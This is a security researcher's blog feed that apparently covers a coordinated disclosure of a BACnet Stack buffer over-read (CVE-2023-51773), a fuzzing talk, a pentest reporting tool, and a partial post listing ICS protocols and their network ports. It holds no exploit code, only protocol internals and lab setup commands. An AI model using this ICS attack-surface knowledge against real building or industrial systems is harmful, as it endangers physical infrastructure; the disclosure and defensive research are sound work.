<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>M</title>
    <description>M</description>
    <link>https://1modm.github.io/</link>
    <atom:link href="https://1modm.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Thu, 11 Jan 2024 14:52:09 +0000</pubDate>
    <lastBuildDate>Thu, 11 Jan 2024 14:52:09 +0000</lastBuildDate>
    <generator>Jekyll v3.9.0</generator>
    
      <item>
        <title>BACnet CVE-2023-51773</title>
        <description>&lt;p&gt;Is there an increase of interest and focus in Cybersecurity referring to Industrial Control Systems (ICSs), not only PLCs, HMIs, RTUs and sensors, there are other elements like chillers, industrial refrigeration, fire detection, fire suppression, energy storage, HVACs, etc. which can be managed through the BACnet protocol.&lt;/p&gt;

&lt;p&gt;Usually are referenced under the term “Intelligent Buildings”, however, their use is neither exclusive to them nor is it something relatively new. The building management is given by the acronym BMS, Building Management System and must be distinguished between residential buildings or industrial buildings. In general, BMS systems integrate a set of subsystems in charge of lighting, fire, alarm, elevator, ventilation, temperature, etc. control systems. Although many of them are common to both environments we cannot say that they are similar since the applications and scope are different.&lt;/p&gt;

&lt;p&gt;These systems must communicate with each other for their own operation and management. One of the protocols used is BACnet (Buiding Automation Control Network) a Data Communication Protocol for Building Automation and Control Networks approved by the ASHRAE Standards Committee. In June 1987 the American Society of Heating, Refrigeration and Air-conditioning Engineers (ASHRAE) set up the Standard Project Committee 135 (SPC 135) to develop a data communications protocol for Building, Automation and Control Networks (BACnet). As well as becoming a US national standard in 1995 (ASHRAE/ANSI 135-1995) and then updated in 2001, in many countries it also became an ISO standard 16484-5 in January 2003. BACnet also became a European standard CEN TC 247 in 2003.&lt;/p&gt;

&lt;p&gt;BACnet has  been  designed  specifically  to  meet  the  communication  needs  of  building  automation  and  control  systems  for  applications  such  as  heating,  ventilating,  and  air-conditioning control, lighting control, access control, and fire detection systems. The BACnet protocol provides mechanisms by which computerized equipment of arbitrary function may exchange information, regardless of the particular building service it performs. As a result, the BACnet protocol may be used by head-end computers, general-purpose direct digital controllers, and application specific or unitary controllers with equal effect.&lt;/p&gt;

&lt;p&gt;Like many others, each BACNet device is a combination of hardware and software, like devices working as controllers, gateways or user interfaces. Each of them has a unique identifier or instance number that identifies and differentiates them from those existing in the network apart from others with information regarding the inputs and outputs that these devices monitors and controls.&lt;/p&gt;

&lt;p&gt;In BACnet we can find 3 differentiated concepts, Objects, Properties and Services, all the information contained within a BACnet device is ordered as objects, which makes it a protocol oriented precisely to this, to objects. Each “Object” represents a component of the device itself or a set of information that can be requested by another through other protocols or layers such as Ethernet, IP, RS-485, etc. The protocol defines more than 50 types of objects for the most common uses.&lt;/p&gt;

&lt;h2 id=&quot;bacnet&quot;&gt;BACnet&lt;/h2&gt;

&lt;p&gt;BACnet was designed to allow communication of building automation and control systems for applications such as heating, ventilating, and air-conditioning control (HVAC), lighting control, access control, and fire detection systems and their associated equipment. The BACnet protocol provides mechanisms for computerized building automation devices to exchange information, regardless of the particular building service they perform.&lt;/p&gt;

&lt;p&gt;BACnet is a communications protocol for Building Automation and Control (BAC) networks UDP based and contains 3 main headers the BVLC, NPDU and APDU.&lt;/p&gt;

&lt;p&gt;A request to BACnet passes down through the lower layers of the protocol stack in the local device, this process can be observed in the next image &lt;a href=&quot;http://bdocam.com/I2BS_TEST/I2BS/BacNet/Protocol/135_2004.pdf&quot;&gt;Source&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/BACnet_protocol_stack_data_flow.png&quot; alt=&quot;BACnet_protocol_stack_data_flow&quot; title=&quot;BACnet_protocol_stack_data_flow&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The 3 headers can be examined in the &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=Main_Page&quot;&gt;BACnet Wiki&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/BACnet_packet.png&quot; alt=&quot;BACnet_packet&quot; title=&quot;BACnet_packet&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;bvlc-bacnet-virtual-link-control-4-bytes&quot;&gt;BVLC (BACNet virtual link control): 4 bytes&lt;/h3&gt;

&lt;p&gt;The firts byte defines the type, in this case bacnet/ip 0x81, the second one defines the function 0x0a, and the last 2 bytes defines the length of the whole packet &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=BACnet_Virtual_Link_Layer&quot;&gt;BACnet Wiki&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The firts byte defines the type: bacnet/ip 0x81&lt;/li&gt;
  &lt;li&gt;The second byte defines the function 0x0a (ORIGINAL_UNICAST_NPDU = 10)&lt;/li&gt;
  &lt;li&gt;The last 2 bytes defines the length of the whole packet&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;public/images/bvlc.png&quot; alt=&quot;bvlc&quot; title=&quot;bvlc&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;NPDU Function:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;public/images/bvlc-function.png&quot; alt=&quot;bvlc&quot; title=&quot;bvlc&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see in the BACnet packet the UDP Port number used by BACnet communications over IP is 47808:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/bvlc-pcap.png&quot; alt=&quot;bvlc&quot; title=&quot;bvlc&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;npdu-network-layer-protocol-data-unit-2-bytes&quot;&gt;NPDU (Network layer protocol data unit): 2 bytes&lt;/h3&gt;

&lt;p&gt;The NPDU consists of a NPCI followed by a NSDU. &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=Network_Layer_Protocol_Data_Unit&quot;&gt;BACnet Wiki&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;According bacnetwiki this is the representation, but be careful here, in practice the headers is just 2 bytes, Version (Always 0x01) and NPCI Control Octet:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/npdu.png&quot; alt=&quot;npdu&quot; title=&quot;npdu&quot; /&gt;&lt;/p&gt;

&lt;p&gt;NPDU Layer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/npdu-pcap.png&quot; alt=&quot;npdu&quot; title=&quot;npdu&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;apdu-network-layer-protocol-data-unit-2-bytes&quot;&gt;APDU (Network layer protocol data unit): 2 bytes&lt;/h3&gt;

&lt;p&gt;BACnet APDUs carry the Application Layer parameters. The maximum size of an APDU is specified by a device’s Max_APDU_Length_Accepted, be careful with that, otherwise you will face malformed packet issues. &lt;a href=&quot;http://www.bacnetwiki.com/wiki/index.php?title=APDU&quot;&gt;BACnet APDU&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;public/images/apdu-pcap.png&quot; alt=&quot;apdu&quot; title=&quot;apdu&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;testbed&quot;&gt;Testbed&lt;/h2&gt;

&lt;p&gt;If we want to create our own lab and scenario we can install the OpenSource BACnet Protocol Stack and test the connectivity to BACnet port, we need:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.bac-test.com/how-to-build-a-foss-bacnet-server-based-on-steve-kargs-sourceforge-project/&quot;&gt;The Free or Open Source Software BACnet Stack&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;A BACNet port open UDP 47808&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo apt-get install -y build-essential
$ sudo apt-get install subversion
$ svn checkout svn://svn.code.sf.net/p/bacnet/code/trunk/bacnet-stack bacnetServer
$ cd bacnetServer
$ make clean all
$ demo/server/bacserv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;cve-2023-51773-bacnet-stack-before-132-has-a-decode-function-apdu-buffer-over-read-in-bacapp_decode_application_data-in-bacappc&quot;&gt;CVE-2023-51773: BACnet Stack before 1.3.2 has a decode function APDU buffer over-read in bacapp_decode_application_data in bacapp.c.&lt;/h1&gt;

&lt;h2 id=&quot;disclosure-timeline&quot;&gt;Disclosure Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;20/10/2023 Discovered vulnerability and developed baseline proof-of-concept.&lt;/li&gt;
  &lt;li&gt;20/12/2023 Reported to https://sourceforge.net/p/bacnet/bugs/85/&lt;/li&gt;
  &lt;li&gt;22/12/2023 Asked for a CVE and coordinated disclosure.&lt;/li&gt;
  &lt;li&gt;25/12/2023 Mitre response and CVE assigned: CVE-2023-51773&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;cve&quot;&gt;CVE&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-51773&quot;&gt;NVD CVE-2023-51773 Details&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;bug-references-and-exploit&quot;&gt;Bug References and Exploit&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://sourceforge.net/p/bacnet/bugs/85/&quot;&gt;https://sourceforge.net/p/bacnet/bugs/85/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;fixes&quot;&gt;Fixes&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/bacnet-stack/bacnet-stack/pull/546&quot;&gt;bacnet-stack/pull/546&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/bacnet-stack/bacnet-stack/pull/546/commits/c465412a076ca6c9ddf649612f2b4e1874d8dcb8&quot;&gt;bacnet-stack/pull/546 details&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/bacnet-stack/bacnet-stack/blob/master/CHANGELOG.md&quot;&gt;CHANGELOG&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/bacnet-stack/bacnet-stack/compare/bacnet-stack-1.3.1...bacnet-stack-1.3.2&quot;&gt;bacnet-stack-1.3.2&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Mon, 25 Dec 2023 00:00:00 +0000</pubDate>
        <link>https://1modm.github.io/CVE-2023-51773.html</link>
        <guid isPermaLink="true">https://1modm.github.io/CVE-2023-51773.html</guid>
        
        
      </item>
    
      <item>
        <title>CorkSec Fuzzing Slides</title>
        <description>&lt;p&gt;Here can be found the slides I used during the &lt;a href=&quot;https://www.meetup.com/en-AU/CorkSec/events/280418335/&quot;&gt;CorkSec 101&lt;/a&gt; talk session on nov 2021.&lt;/p&gt;

&lt;h2 id=&quot;corksec&quot;&gt;Cork|Sec&lt;/h2&gt;

&lt;p&gt;Running since June 2013, every month we have 2 talks focused on Security or Technology - followed by socialising with like minded people – and you can find out exactly what to expect on the About Us section of our Meetup page. Past talk details are on our wiki on &lt;a href=&quot;http://corksec.com/&quot;&gt;CorkSec&lt;/a&gt;. All people with any sort of an interest or level of knowledge in Security, Hacking and Emerging Technology are more than welcome to attend and feel free to bring like minded colleagues and friends. CorkSec is a free event (free as in beer, and as in speech).&lt;/p&gt;

&lt;h2 id=&quot;talk-introduction-to-fuzz-testing-fuzzing&quot;&gt;TALK: Introduction to Fuzz Testing (Fuzzing)&lt;/h2&gt;

&lt;p&gt;Fuzzing, the art of breaking things. Fuzzing is a technique for testing software using automated tools to provide invalid or unexpected input to a program or function in a program. The talk will give an understanding of what fuzzing is, and an introduction to fuzz testing concepts, strategy and techniques which goal is to find bugs. We will take some demos for code coverage for python and blackbox testing for the BACnet network protocol.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://1modm.github.io/public/CorkSec-Fuzzing.pdf&quot;&gt;Fuzzing CorkSec 101 Slides&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 20 Dec 2021 00:00:00 +0000</pubDate>
        <link>https://1modm.github.io/CorkSec.html</link>
        <guid isPermaLink="true">https://1modm.github.io/CorkSec.html</guid>
        
        
      </item>
    
      <item>
        <title>PeTeReport</title>
        <description>&lt;p&gt;The amount of time writing the report during an assessment could frustrate everybody, a good looking report it is necessary to correctly capture the discovered findings. While I was testing other great reporting tools like &lt;a href=&quot;https://github.com/certmichelin/PTART&quot;&gt;PTART&lt;/a&gt;, &lt;a href=&quot;https://github.com/blacklanternsecurity/writehat&quot;&gt;writehat&lt;/a&gt; or &lt;a href=&quot;https://github.com/pwndoc/pwndoc&quot;&gt;pwndoc&lt;/a&gt; I didn’t found the one that could cover all our needs. So why not to do it yourself?&lt;/p&gt;

&lt;p&gt;To manage the data I used django, for the PDF reporting &lt;a href=&quot;https://github.com/noraj/OSCP-Exam-Report-Template-Markdown&quot;&gt;OSCP-Exam-Report-Template-Markdown&lt;/a&gt; and &lt;a href=&quot;https://pandoc.org/&quot;&gt;pandoc&lt;/a&gt;, for the frontend &lt;a href=&quot;https://adminlte.io/&quot;&gt;AdminLTE&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;petereport&quot;&gt;PeTeReport&lt;/h2&gt;

&lt;p&gt;PeTeReport (&lt;strong&gt;Pe&lt;/strong&gt;n&lt;strong&gt;Te&lt;/strong&gt;st &lt;strong&gt;Report&lt;/strong&gt;) is an open-source application vulnerability reporting tool designed to assist pentesting/redteaming efforts, by simplifying the task of writting and generation of reports.&lt;/p&gt;

&lt;p&gt;Focused in product security, the tool help security researchers and pentesters to provide detailed findings, appendix, attack paths and manage a finding template database to avoid wasting time spent in the reporting phase.&lt;/p&gt;

&lt;p&gt;PeTeReport (&lt;strong&gt;Pe&lt;/strong&gt;n&lt;strong&gt;Te&lt;/strong&gt;st &lt;strong&gt;Report&lt;/strong&gt;) is written in Django and Python 3 with the aim to help pentesters to manage a finding repository, write reports (in Markdown) and generate reports in different formats (HTML, CSV, PDF, Jupyter and Markdown).&lt;/p&gt;

&lt;h4 align=&quot;center&quot;&gt;Pentesting content management and reporting tool&lt;/h4&gt;

&lt;h1 align=&quot;center&quot;&gt;
  &lt;br /&gt;
  &lt;a href=&quot;https://github.com/1modm/petereport&quot;&gt;&lt;img src=&quot;https://github.com/1modm/petereport/raw/main/images/dashboard.png&quot; alt=&quot;petereport&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/a&gt;
  &lt;br /&gt;
&lt;/h1&gt;

&lt;h2 id=&quot;documentation&quot;&gt;Documentation&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;https://1modm.github.io/petereport/&quot;&gt;Documentation&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;installation-and-deployment&quot;&gt;Installation and deployment&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://1modm.github.io/petereport/docker/&quot;&gt;Docker&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://1modm.github.io/petereport/django/&quot;&gt;Django&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;features&quot;&gt;Features&lt;/h2&gt;

&lt;ul class=&quot;task-list&quot;&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Customizable reports output&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Customizable reports templates&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Findings template database&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Possibility to add appendix to findings&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Possibility to add attack trees &lt;a href=&quot;https://www.deciduous.app/&quot;&gt;Deciduous&lt;/a&gt; to findings&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;HTML Output format&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;CSV Output format&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;PDF Output format&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Jupyter Notebook Output format&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Markdown Output format&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;CVSS 3.1 Score&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;Docker installation&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;DefectDojo integration&lt;/li&gt;
  &lt;li class=&quot;task-list-item&quot;&gt;&lt;input type=&quot;checkbox&quot; class=&quot;task-list-item-checkbox&quot; disabled=&quot;disabled&quot; checked=&quot;checked&quot; /&gt;User management&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Fri, 05 Nov 2021 00:00:00 +0000</pubDate>
        <link>https://1modm.github.io/PeteReport.html</link>
        <guid isPermaLink="true">https://1modm.github.io/PeteReport.html</guid>
        
        
      </item>
    
      <item>
        <title>Fuzzing ICS protocols</title>
        <description>&lt;p&gt;&lt;strong&gt;ICS&lt;/strong&gt; stands for Industrial Control Systems, the term is very generic and is commonly used to describe control systems and their instrumentation, usually for controlling and monitoring industrial processes. ICS basically integrates hardware, software and their network connectivity for running and supporting critical infrastructure. ICS systems get data from remote sensors and send commands to the machinery for the appropriate actions to take.&lt;/p&gt;

&lt;p&gt;In this post we are going to focus in BACnet and modbus protocols.&lt;/p&gt;

&lt;h2 id=&quot;typical-ics-components&quot;&gt;Typical ICS components&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Supervisory Control and Data Acquisition (SCADA)&lt;/li&gt;
  &lt;li&gt;Industrial Automation and Control Systems (IACS)&lt;/li&gt;
  &lt;li&gt;Human Machine Interface (HMI)&lt;/li&gt;
  &lt;li&gt;Distributed Control Systems (DCS)&lt;/li&gt;
  &lt;li&gt;Control Servers&lt;/li&gt;
  &lt;li&gt;Programmable Automation Controllers (PAC)&lt;/li&gt;
  &lt;li&gt;Programmable Logic Controllers (PLC)&lt;/li&gt;
  &lt;li&gt;Intelligent Electronic Devices (IED)&lt;/li&gt;
  &lt;li&gt;Sensors&lt;/li&gt;
  &lt;li&gt;Remote Terminal Units (RTU)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;typical-ics-protocols-used&quot;&gt;Typical ICS protocols used&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;The Common Industrial Protocol (&lt;strong&gt;CIP&lt;/strong&gt;) is a protocol created by the ODVA company for automating industrial processes. CIP comprises a set of services and messages for control, security, synchronization, configuration, information, and so forth which can be integrated into Ethernet networks and into  the Internet.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Modbus&lt;/strong&gt; is one of the oldest industrial control protocols. It was introduced in 1979 using serial communications to interact with PLCs. It is open-source and freely distributed and can be built by anyone into their equipment. Modbus work in the application layer, which permits different physical uses for transport layer. It  provides communication in client-server mode among differing sorts of equipment connected through different technologies on lower layers, which include but not limited to, the TCP/IP protocol layer. 
 Modbus has several security concerns: Lack of authentication, lack of encryption, lack of message checksum and lack of broadcast suppression.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;DNP3&lt;/strong&gt; stands for Distributed Network Protocol. It was developed in 1993 and is widely used in the USA and Canada. It is only sparsely used in Europe, because  there are alternatives such as IEC-60870-5-101 or IEC-60870-5-104. It operates at the application, data link and transport layers; thus, it is a three-layer protocol.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;HART&lt;/strong&gt; (Highway Addressable Remote Transducer) is a hybrid analog+digital industrial automation open protocol. HART is widely used in process and instrumentation systems ranging from small automation applications up to highly sophisticated industrial applications.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;TASE&lt;/strong&gt; (Telecontrol Application Service Element) 2.0 is also known as &lt;strong&gt;ICCP&lt;/strong&gt; (Inter Control Center Protocol) or International Electrotechnical Commission (IEC) 60870-6, but they are more commonly referred to as ICCP. Since different vendors had their own custom and proprietary protocols, there was a need for a common protocol for communication and data exchange between different control centers. Keeping this in mind, ICCP/TASE 2.0 was designed. Unlike Modbus, which was designed for serial communication, ICCP has been designed specifically for communication over LAN (Local Area Network) and WAN (Wide Area Network). ICCP is used in communication between different control centers, power pools, sub-stations, other utilities and non-utility generators.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Profibus&lt;/strong&gt; (PROcessFieldBUS acronym) is a standard for communication through Fieldbus promoted in 1989 by the German Department of Education and Researchand used by Siemens. It is based on serial communications by cable (RS-485,  MBP) or optical fibercable. Has two variants, Profibus DP (for decentralized peripherals) and Profibus PA (for process automation).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Profinet&lt;/strong&gt;  is a standard based on  Profibus that adopts Ethernet as its physical interface for connections rather than RS485. It offers  the  complete  TCP/IP functionality for data transmission. Profinet is oriented toward reliability and real-time communications, together with usability.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;BACnet&lt;/strong&gt; was designed to allow communication of building automation and control systems for applications such as heating, ventilating, and air-conditioning control (HVAC), lighting control, access control, and fire detection systems and their associated equipment. The BACnet protocol provides mechanisms for computerized building automation devices to exchange information, regardless of the particular building service they perform.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;OPC&lt;/strong&gt; (OLE for  process control) is not an industrial communications protocol, but rather an operational framework for communications in process control systems based on Windows that use object linking and embedding (OLE).&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;standard-protocol-ports&quot;&gt;Standard Protocol Ports&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Protocol&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Ports&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;BACnet/IP&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;UDP/47808&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;DNP3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/20000, UDP/20000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;EtherCAT&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;UDP/34980&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Ethernet/IP&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/44818, UDP/2222, UDP/44818&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;FL-net&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;UDP/55000 to 55003&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Foundation Fieldbus HSE&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/1089 to 1091, UDP/1089 to 1091&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ICCP&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/102&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Modbus TCP&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/502&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;OPC UA Binary&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Vendor Application Specific&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;OPC UA Discovery Server&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/4840&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;OPC UA XML&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/80, TCP/443&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PROFINET&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/34962 to 34964, UDP/34962 to 34964&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;ROC PLus&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP 4000&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;vendor-specific-ports&quot;&gt;Vendor Specific Ports&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Vendor&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Product or Protocol&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Ports&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;ABB&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Ranger 2003&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/10307, TCP/10311, TCP/10364 to 10365, TCP/10407, TCP/10409 to 10410, TCP/10412, TCP/10414 to 10415, TCP/10428, TCP/10431 to 10432, TCP/10447, TCP/10449 to 10450, TCP/12316, TCP/12645, TCP/12647 to 12648, TCP/13722, TCP/13724, TCP/13782 to 13783, TCP/38589, TCP/38593, TCP/38600, TCP/38971, TCP/39129, TCP/39278&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Emerson / Fisher&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ROC Plus&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP/4000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Foxboro/Invensys&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Foxboro DCS FoxApi&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP/55555&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Foxboro/Invensys&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Foxboro DCS AIMAPI&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP/45678&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Foxboro/Invensys&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Foxboro DCS Informix&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/UDP/1541&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Iconics&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Genesis32 GenBroker (TCP)&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;TCP/18000&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Johnson Controls&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Metasys N1&lt;/td&gt;
